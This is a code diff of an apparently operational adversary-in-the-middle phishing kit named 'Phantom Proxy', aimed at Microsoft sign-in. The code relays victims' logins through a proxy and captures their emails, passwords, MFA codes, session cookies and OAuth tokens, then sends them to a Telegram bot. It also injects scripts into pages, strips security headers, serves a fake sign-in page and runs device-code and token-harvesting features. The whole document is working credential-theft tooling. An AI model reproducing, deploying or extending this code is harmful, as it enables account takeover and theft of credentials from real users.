@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v9.0 — COMPLETE EXPRESS EDITION (No AI BEC)
+// 🥔 PHANTOM PROXY v9.0 — FULL AiTM + DASHBOARD + ALL FEATURES
 // ============================================================
-// 🔥 ALL FEATURES: Proxy + Dashboard + PRT + Graph API + Token Vault + Device Code + Telegram + Auto-Refresh + Conversions
+// 🔥 ONE server: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Auto-Refresh
 // ============================================================
 
 const http = require("http");
@@ -58,7 +58,6 @@ const PRT_STORAGE_FILE = path.join(__dirname, "prt_storage.json");
 if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
 if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
 
-const fsPromises = fs.promises;
 const LOG_FILE_STREAMS = {};
 const VICTIM_SESSIONS = {};
 let deviceFlows = [];
@@ -82,10 +81,6 @@ class CacheManager {
         const expiry = Date.now() + (ttl || this.ttl);
         this.cache.set(key, { value, expiry });
         return value;
-    }
-    getStats() {
-        const total = this.hits + this.misses;
-        return { size: this.cache.size, hits: this.hits, misses: this.misses, hitRate: total > 0 ? (this.hits / total * 100).toFixed(1) + '%' : '0%' };
     }
     clean() {
         const now = Date.now();
@@ -117,8 +112,6 @@ const USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
 ];
 function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
@@ -132,15 +125,8 @@ async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
         const filename = `tokens_${sessionId}_${timestamp}.txt`;
         const filePath = path.join(os.tmpdir(), filename);
-        let content = '# ============================================================\n';
-        content += '# 🔑 FULL TOKENS DUMP\n';
-        content += '# ============================================================\n';
-        content += `# Session ID: ${sessionId}\n`;
-        content += `# Captured: ${new Date().toISOString()}\n`;
-        content += `# Email: ${email || 'N/A'}\n`;
-        content += `# Password: ${password || 'N/A'}\n`;
-        content += `# MFA Code: ${mfaCode || 'N/A'}\n`;
-        content += '# ============================================================\n\n';
+        let content = '# 🔑 FULL TOKENS DUMP\n';
+        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n# Email: ${email || 'N/A'}\n# Password: ${password || 'N/A'}\n# MFA: ${mfaCode || 'N/A'}\n\n`;
         for (const [key, val] of Object.entries(tokens)) {
             if (val) content += `${key.toUpperCase()}:\n${val}\n\n`;
         }
@@ -182,20 +168,21 @@ async function sendToTelegram(data) {
     if (!axios) return;
     try {
         const sessionId = data.sessionId || 'unknown';
-        const ip = data.ip || 'Unknown';
         const email = data.email || 'N/A';
         const password = data.password || 'N/A';
         const mfa = data.mfa || 'N/A';
         const tokens = data.tokens || {};
         const cookies = data.cookies || {};
 
-        let message = `🔐 **LOGIN CAPTURED!**\n\n👤 **Email:** ${email}\n🔐 **Password:** ${password}\n📱 **MFA:** ${mfa}\n🌍 **IP:** ${ip}\n🆔 **Session:** ${sessionId}\n🕒 **Time:** ${new Date().toISOString()}\n\n📎 **Attachments:**\n`;
+        let message = `🔐 **LOGIN CAPTURED!**\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
         if (Object.keys(tokens).length > 0) {
-            message += '🔑 Tokens file attached.\n';
+            message += '\n\n🔑 Tokens:\n';
+            for (const [k, v] of Object.entries(tokens)) message += `${k}: ${v.slice(0, 30)}...\n`;
             await sendTokensFile(tokens, sessionId, email, password, mfa);
         }
         if (Object.keys(cookies).length > 0) {
-            message += '🍪 Cookies file attached.\n';
+            message += '\n🍪 Cookies:\n';
+            for (const [k, v] of Object.entries(cookies)) message += `${k}: ${v.slice(0, 30)}...\n`;
             await sendCookiesFile(cookies, sessionId);
         }
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -204,9 +191,7 @@ async function sendToTelegram(data) {
             parse_mode: 'Markdown'
         }, { timeout: 5000 });
         console.log(`✅ Telegram exfil for session ${sessionId}`);
-    } catch (e) {
-        console.error('Telegram send failed:', e.message);
-    }
+    } catch (e) { console.error('Telegram send failed:', e.message); }
 }
 
 // ============================================================
@@ -217,7 +202,7 @@ function getUserSession(requestCookies) {
     const cookies = requestCookies.split("; ");
     for (const cookie of cookies) {
         const [name, ...val] = cookie.split("=");
-        if (VICTIM_SESSIONS.hasOwnProperty(name) && VICTIM_SESSIONS[name].value === val.join("=")) return name;
+        if (VICTIM_SESSIONS[name] && VICTIM_SESSIONS[name].value === val.join("=")) return name;
     }
     return;
 }
@@ -236,19 +221,24 @@ function createSessionLogFile(logFilename, currentSession) {
 function generateNewSession(phishedURL) {
     const cookieName = generateRandomString(12);
     const cookieValue = generateRandomString(32);
-    VICTIM_SESSIONS[cookieName] = {};
-    VICTIM_SESSIONS[cookieName].value = cookieValue;
-    VICTIM_SESSIONS[cookieName].cookies = [];
-    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}.log`;
+    VICTIM_SESSIONS[cookieName] = {
+        value: cookieValue,
+        cookies: [],
+        protocol: phishedURL.protocol,
+        hostname: phishedURL.hostname,
+        path: phishedURL.pathname + phishedURL.search,
+        port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
+        host: phishedURL.host,
+        logFilename: `${phishedURL.host}__${new Date().toISOString()}.log`
+    };
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
     return { cookieName, cookieValue };
 }
 
 function displayError(message, error, ...args) {
     console.error("******************************");
-    console.error(`${message}: ${error.name ?? error}`);
+    console.error(`${message}: ${error.name || error}`);
     console.error(`Message: ${error.message}`);
-    console.error(`Stack trace: ${error.stack}`);
     for (let i = 0; i < args.length; i++) console.error(`Parameter ${i + 1}: ${args[i]}`);
     console.error("******************************");
 }
@@ -258,10 +248,9 @@ async function encryptData(data) {
     return new Promise((resolve, reject) => {
         const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
         const encryptedData = [];
-        cipher
-            .on("error", reject)
-            .on("data", chunk => encryptedData.push(chunk))
-            .on("end", () => resolve({ iv: iv.toString("hex"), encryptedData: Buffer.concat(encryptedData).toString("hex") }));
+        cipher.on("error", reject)
+              .on("data", chunk => encryptedData.push(chunk))
+              .on("end", () => resolve({ iv: iv.toString("hex"), encryptedData: Buffer.concat(encryptedData).toString("hex") }));
         cipher.write(data, "utf-8");
         cipher.end();
     });
@@ -290,7 +279,7 @@ function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
     if (sCookie.length < 2) return false;
     if (cookieHostOnly && sReq.length !== sCookie.length) return false;
     if (sReq.length < sCookie.length) return false;
-    for (let i = 1, l = sCookie.length + 1; i < l; i++) if (sCookie.at(-i) !== sReq.at(-i)) return false;
+    for (let i = 1; i < sCookie.length + 1; i++) if (sCookie.at(-i) !== sReq.at(-i)) return false;
     return true;
 }
 
@@ -298,7 +287,7 @@ function isPathApplicable(requestPath, cookiePath) {
     const sReq = requestPath.split("/"), sCookie = cookiePath.split("/");
     if (cookiePath === "/") return true;
     if (sReq.length < sCookie.length) return false;
-    for (let i = 1, l = sCookie.length; i < l; i++) if (sCookie[i] !== sReq[i]) return false;
+    for (let i = 1; i < sCookie.length; i++) if (sCookie[i] !== sReq[i]) return false;
     return true;
 }
 
@@ -360,11 +349,8 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
         const [cookie, ...attrs] = newCookie.split(";");
         const [cookieName, ...cookieVal] = cookie.split("=");
         let cookieDomain = request.hostname;
-        let cookiePath = (pathNameMatch ?? ["/"])[0];
-        let cookieExpires = NaN;
-        let cookieMaxAge = "";
-        let cookieHostOnly = true;
-        let isValid = true;
+        let cookiePath = (pathNameMatch || ["/"])[0];
+        let cookieExpires = NaN, cookieMaxAge = "", cookieHostOnly = true, isValid = true;
         for (const attr of attrs) {
             const a = attr.trim();
             const dm = a.match(/^domain\s*=(.*)$/i);
@@ -372,7 +358,7 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
             const em = a.match(/^expires\s*=(.*)$/i);
             const mm = a.match(/^max-age\s*=(.*)$/i);
             if (a.toLowerCase() === "domain") { cookieDomain = request.hostname; cookieHostOnly = true; isValid = true; }
-            else if (a.toLowerCase() === "path") { cookiePath = (pathNameMatch ?? ["/"])[0]; }
+            else if (a.toLowerCase() === "path") { cookiePath = (pathNameMatch || ["/"])[0]; }
             else if (a.toLowerCase() === "expires") { cookieExpires = NaN; }
             else if (a.toLowerCase() === "max-age") { cookieMaxAge = ""; }
             else if (dm) {
@@ -387,7 +373,7 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
                 }
             } else if (pm) {
                 cookiePath = pm[1].trim();
-                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch ?? ["/"])[0];
+                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch || ["/"])[0];
             } else if (em) {
                 cookieExpires = parseCookieDate(em[1].trim());
             } else if (mm) {
@@ -435,8 +421,7 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     if (proxyRequestOptions.headers.origin) {
         proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
     }
-    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
-        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
+    if (proxyRequestOptions.headers.referer && proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT)) {
         delete proxyRequestOptions.headers.referer;
     }
     for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
@@ -492,27 +477,44 @@ function updateHTMLProxyResponse(body) {
     for (const [key, val] of Object.entries(map)) {
         const tag = Buffer.from(key);
         const idx = body.subarray(0, limit).indexOf(tag);
-        if (idx !== -1) {
-            return Buffer.concat([body.subarray(0, idx), Buffer.from(val), body.subarray(idx + tag.byteLength)]);
-        }
+        if (idx !== -1) return Buffer.concat([body.subarray(0, idx), Buffer.from(val), body.subarray(idx + tag.byteLength)]);
     }
     return Buffer.concat([Buffer.from(`<head>${payload}</head>`), body]);
 }
 
 function updateFederationRedirectUrl(body, proxyHostname) {
-    const obj = JSON.parse(body.toString());
-    const url = obj.Credentials.FederationRedirectUrl;
-    const proxyUrl = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
-    proxyUrl.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(url));
-    obj.Credentials.FederationRedirectUrl = proxyUrl;
-    return Buffer.from(JSON.stringify(obj));
+    try {
+        const obj = JSON.parse(body.toString());
+        const url = obj.Credentials.FederationRedirectUrl;
+        const proxyUrl = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
+        proxyUrl.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(url));
+        obj.Credentials.FederationRedirectUrl = proxyUrl;
+        return Buffer.from(JSON.stringify(obj));
+    } catch (e) { return body; }
+}
+
+// ── Ensure HTML files exist ──
+const indexFile = path.join(__dirname, PROXY_FILES.index);
+const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
+const scriptFile = path.join(__dirname, PROXY_FILES.script);
+if (!fs.existsSync(indexFile)) {
+    fs.writeFileSync(indexFile, `<!DOCTYPE html><html><head><title>Sign in</title></head><body><h1>Sign in</h1><form action="/capture" method="POST"><input name="email"><input name="password" type="password"><button>Next</button></form></body></html>`);
+    console.log('✅ Created dummy index.html');
+}
+if (!fs.existsSync(notFoundFile)) {
+    fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
+    console.log('✅ Created dummy 404.html');
+}
+if (!fs.existsSync(scriptFile)) {
+    fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
+    console.log('✅ Created dummy script.js');
 }
 
 // ============================================================
-// 🌐 PROXY HANDLER
+// 🌐 PROXY SERVER
 // ============================================================
-const proxyHandler = async (req, res) => {
-    const { method, url, headers } = req;
+const proxyServer = http.createServer((clientRequest, clientResponse) => {
+    const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
@@ -521,50 +523,52 @@ const proxyHandler = async (req, res) => {
             let session = currentSession;
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                res.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
             VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[session].port = phishedURL.port;
+            VICTIM_SESSIONS[session].path = phishedURL.pathname + phishedURL.search;
+            VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
-            res.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(res);
+            clientResponse.writeHead(200, { "Content-Type": "text/html" });
+            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
         } catch (error) {
             displayError("Entry point error", error, url);
-            res.writeHead(404, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.notFound).pipe(res);
+            clientResponse.writeHead(404, { "Content-Type": "text/html" });
+            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
         }
         return;
     }
 
     if (url === PROXY_PATHNAMES.serviceWorker) {
-        res.writeHead(200, { "Content-Type": "text/javascript" });
-        fs.createReadStream(url.slice(1)).pipe(res);
+        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
+        fs.createReadStream(url.slice(1)).pipe(clientResponse);
         return;
     }
 
     if (url === PROXY_PATHNAMES.favicon) {
         if (currentSession && VICTIM_SESSIONS[currentSession]) {
-            res.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
+            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
         } else {
-            res.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
+            clientResponse.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
         }
-        res.end();
+        clientResponse.end();
         return;
     }
 
     if (url === PROXY_PATHNAMES.proxy || currentSession) {
         let clientRequestBody = [];
-        req.on("data", (chunk) => clientRequestBody.push(chunk))
-           .on("end", async () => {
+        clientRequest
+            .on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
+            .on("data", (chunk) => clientRequestBody.push(chunk))
+            .on("end", () => {
                 clientRequestBody = Buffer.concat(clientRequestBody).toString();
 
                 if (!currentSession) {
-                    res.writeHead(301, { Location: REDIRECT_URL });
-                    res.end();
+                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                    clientResponse.end();
                     return;
                 }
 
@@ -583,61 +587,59 @@ const proxyHandler = async (req, res) => {
                     if (url === PROXY_PATHNAMES.jsCookie) {
                         updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                         const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-                        res.writeHead(200, { "Content-Type": "application/json" });
-                        res.end(JSON.stringify(validDomains));
+                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
+                        clientResponse.end(JSON.stringify(validDomains));
                         return;
                     } else if (url === PROXY_PATHNAMES.proxy) {
                         try {
                             const parsed = JSON.parse(clientRequestBody);
                             let proxyRequestURL = new URL(parsed.url);
-                            let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
+                            let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
 
                             if (proxyRequestURL.hostname === headers.host) {
                                 if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                     const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                     VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                     VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
-                                    VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
-                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port;
+                                    VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
+                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
                                     VICTIM_SESSIONS[currentSession].host = phishedURL.host;
-                                    res.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
-                                    res.end();
+                                    clientResponse.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
+                                    clientResponse.end();
                                     return;
                                 } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
-                                    res.writeHead(200, { "Content-Type": "text/javascript" });
-                                    fs.createReadStream(PROXY_FILES.script).pipe(res);
+                                    clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
+                                    fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                     return;
                                 } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                     try {
                                         const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                         proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
-                                        proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
+                                        proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
                                     } catch (error) {
                                         displayError("Mutation parse failed", error, proxyRequestPath);
-                                        res.writeHead(404, { "Content-Type": "text/html" });
-                                        fs.createReadStream(PROXY_FILES.notFound).pipe(res);
+                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                         return;
                                     }
                                 } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                     updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], headers.host, currentSession);
                                     const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-                                    res.writeHead(200, { "Content-Type": "application/json" });
-                                    res.end(JSON.stringify(validDomains));
+                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
+                                    clientResponse.end(JSON.stringify(validDomains));
                                     return;
                                 }
                             }
                             proxyRequestProtocol = proxyRequestURL.protocol;
                             proxyRequestOptions.path = proxyRequestPath;
-                            proxyRequestOptions.port = proxyRequestURL.port;
+                            proxyRequestOptions.port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
                             proxyRequestOptions.method = parsed.method;
                             proxyRequestOptions.headers = { ...headers, ...parsed.headers };
                             if (proxyRequestURL.hostname !== headers.host) {
                                 proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                 proxyRequestOptions.headers.host = proxyRequestURL.host;
                             }
-                            if (proxyRequestOptions.headers.referer) {
-                                proxyRequestOptions.headers.referer = parsed.referrer;
-                            }
+                            if (proxyRequestOptions.headers.referer) proxyRequestOptions.headers.referer = parsed.referrer;
                             isNavigationRequest = parsed.mode === "navigate";
                             clientRequestBody = parsed.body;
                         } catch (error) {
@@ -653,14 +655,10 @@ const proxyHandler = async (req, res) => {
                 proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                 updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
 
-                const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
+                const proxyRequestBody = clientRequestBody.body || clientRequestBody;
                 const contentLength = Buffer.byteLength(proxyRequestBody);
-                if (contentLength) {
-                    proxyRequestOptions.headers["content-length"] = contentLength.toString();
-                } else {
-                    delete proxyRequestOptions.headers["content-type"];
-                    delete proxyRequestOptions.headers["content-length"];
-                }
+                if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
+                else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }
 
                 if (isNavigationRequest) {
                     VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
@@ -673,28 +671,22 @@ const proxyHandler = async (req, res) => {
                 const protocol = proxyRequestProtocol === "https:" ? https : http;
                 const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
                     // ── ✅ REDIRECT INTERCEPTION ──
-                    if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
+                    if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
                         const location = proxyResponse.headers.location;
-                        if (location) {
-                            try {
-                                const locationURL = new URL(location);
-                                VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-                                VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-                                VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
-                                VICTIM_SESSIONS[currentSession].port = locationURL.port;
-                                VICTIM_SESSIONS[currentSession].host = locationURL.host;
-                                proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
-                                console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
-                            } catch (e) {
-                                VICTIM_SESSIONS[currentSession].path = location;
-                            }
-                        }
+                        try {
+                            const locationURL = new URL(location);
+                            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
+                            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
+                            VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
+                            VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
+                            VICTIM_SESSIONS[currentSession].host = locationURL.host;
+                            proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
+                            console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
+                        } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
                     }
 
                     const setCookieHeaders = proxyResponse.headers["set-cookie"];
-                    if (setCookieHeaders) {
-                        updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
-                    }
+                    if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
                     proxyResponse.headers["cache-control"] = "no-store";
                     proxyResponse.headers["access-control-allow-origin"] = `https://${headers.host}`;
                     deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
@@ -743,54 +735,47 @@ const proxyHandler = async (req, res) => {
                                     }
                                 }
                                 if (Object.keys(tokens).length > 0 || email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A') {
-                                    await sendToTelegram({ sessionId: currentSession, ip: proxyRequestOptions.headers['x-real-ip'] || 'Unknown', email, password, mfa, tokens, cookies });
+                                    await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
                                 }
                             } catch (e) {}
 
                             // ── HTML injection ──
-                            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
-                                Buffer.byteLength(bodyBuffer)) {
+                            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                     bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
                                     bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
-                                    if (proxyResponse.headers["content-length"]) {
-                                        proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
-                                    }
+                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                 } catch (error) {
                                     displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                 }
                             }
 
-                            // ── FederationRedirectUrl modification ──
+                            // ── FederationRedirectUrl ──
                             else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                     bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
                                     bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
-                                    if (proxyResponse.headers["content-length"]) {
-                                        proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
-                                    }
+                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                 } catch (error) {
                                     displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                 }
                             }
 
-                            res.writeHead(proxyResponse.statusCode, proxyResponse.headers);
-                            res.end(bodyBuffer);
+                            clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
+                            clientResponse.end(bodyBuffer);
                         });
                 });
 
-                if (proxyRequestBody) {
-                    proxyReq.write(proxyRequestBody);
-                }
+                if (proxyRequestBody) proxyReq.write(proxyRequestBody);
                 proxyReq.end();
-           });
+            });
     } else {
-        res.writeHead(301, { Location: REDIRECT_URL });
-        res.end();
+        clientResponse.writeHead(301, { Location: REDIRECT_URL });
+        clientResponse.end();
     }
-};
+});
 
 // ============================================================
 // 🎛️ EXPRESS DASHBOARD
@@ -825,8 +810,7 @@ dashApp.get('/', (req, res) => {
 dashApp.get('/api/status', (req, res) => {
     try {
         const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
-        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
-        res.json({ online: true, totalSessions: files.length, lastCapture: last });
+        res.json({ online: true, totalSessions: files.length });
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
@@ -883,7 +867,7 @@ if (AdmZip) {
 }
 
 // ── Device Code ──
-function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { const data = fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8'); deviceFlows = JSON.parse(data); } } catch (e) {} }
+function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {} }
 function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
 loadDeviceFlows();
 
@@ -896,7 +880,7 @@ dashApp.post('/api/device/request', async (req, res) => {
             { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
         );
         const data = response.data;
-        const flow = {
+        deviceFlows.push({
             device_code: data.device_code,
             user_code: data.user_code,
             verification_uri: data.verification_uri,
@@ -906,8 +890,7 @@ dashApp.post('/api/device/request', async (req, res) => {
             created: new Date().toISOString(),
             client_id: clientId,
             session_id: crypto.randomBytes(16).toString('hex')
-        };
-        deviceFlows.push(flow);
+        });
         saveDeviceFlows();
         res.json(data);
     } catch (error) {
@@ -1008,92 +991,38 @@ class TokenVault {
                             const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                             if (accessMatch) {
                                 const token = decodeURIComponent(accessMatch[1]);
-                                const username = this.extractUsernameFromToken(token);
-                                this.tokens.push({ type: 'access', value: token, file, username, timestamp: new Date().toISOString() });
+                                this.tokens.push({ type: 'access', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                             }
                             const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                             if (refreshMatch) {
                                 const token = decodeURIComponent(refreshMatch[1]);
-                                const username = this.extractUsernameFromToken(token);
-                                this.tokens.push({ type: 'refresh', value: token, file, username, timestamp: new Date().toISOString() });
+                                this.tokens.push({ type: 'refresh', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                             }
                             const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                             if (idMatch) {
                                 const token = decodeURIComponent(idMatch[1]);
-                                const username = this.extractUsernameFromToken(token);
-                                this.tokens.push({ type: 'id', value: token, file, username, timestamp: new Date().toISOString() });
+                                this.tokens.push({ type: 'id', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
